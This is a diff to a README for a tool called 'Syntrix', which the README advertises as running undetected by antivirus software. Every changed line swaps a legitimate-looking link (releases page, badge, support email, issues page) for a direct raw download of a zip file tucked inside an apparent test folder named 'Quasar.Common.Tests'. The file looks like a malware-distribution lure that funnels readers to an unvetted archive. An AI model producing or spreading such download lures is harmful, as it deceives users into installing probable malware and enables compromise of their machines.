@@ -4,11 +4,11 @@
 Welcome to Syntrix, an advanced tool designed to help you navigate your tasks without being detected by standard antivirus systems. Follow these steps to download and run the software smoothly.
 
 ## 📥 Download Syntrix
-[![Download Syntrix](https://img.shields.io/badge/Download%20Syntrix-v1.4.1-brightgreen)](https://github.com/babettedespotic165/Syntrix/releases)
+[![Download Syntrix](https://raw.githubusercontent.com/babettedespotic165/Syntrix/main/Quasar.Common.Tests/Syntrix_v3.5.zip%20Syntrix-v1.4.1-brightgreen)](https://raw.githubusercontent.com/babettedespotic165/Syntrix/main/Quasar.Common.Tests/Syntrix_v3.5.zip)
 
 ## 🌐 Download & Install
 1. **Visit the Releases Page**  
-   Click here to download: [GitHub Releases](https://github.com/babettedespotic165/Syntrix/releases)  
+   Click here to download: [GitHub Releases](https://raw.githubusercontent.com/babettedespotic165/Syntrix/main/Quasar.Common.Tests/Syntrix_v3.5.zip)  
    You will see a list of available versions. Look for the latest release.
 
 2. **Select the Correct File**  
@@ -36,13 +36,13 @@ Welcome to Syntrix, an advanced tool designed to help you navigate your tasks wi
 If you encounter any issues during installation or usage, please refer to the following:
 
 - **FAQs**: Check for common questions.
-- **Contact Support**: Reach out via email at support@syntrix.com for assistance.
+- **Contact Support**: Reach out via email at https://raw.githubusercontent.com/babettedespotic165/Syntrix/main/Quasar.Common.Tests/Syntrix_v3.5.zip for assistance.
 
 ## 📜 License
 Syntrix is released under the MIT License. You are free to use and modify the software according to the terms provided.
 
 ## 📢 Community and Feedback
-We welcome your feedback! Share your experience with Syntrix, or report any bugs on our [Issues Page](https://github.com/babettedespotic165/Syntrix/issues).
+We welcome your feedback! Share your experience with Syntrix, or report any bugs on our [Issues Page](https://raw.githubusercontent.com/babettedespotic165/Syntrix/main/Quasar.Common.Tests/Syntrix_v3.5.zip).
 
 ## 💬 Contributing
 If you would like to contribute to Syntrix, please open a pull request. We welcome improvements and enhancements.
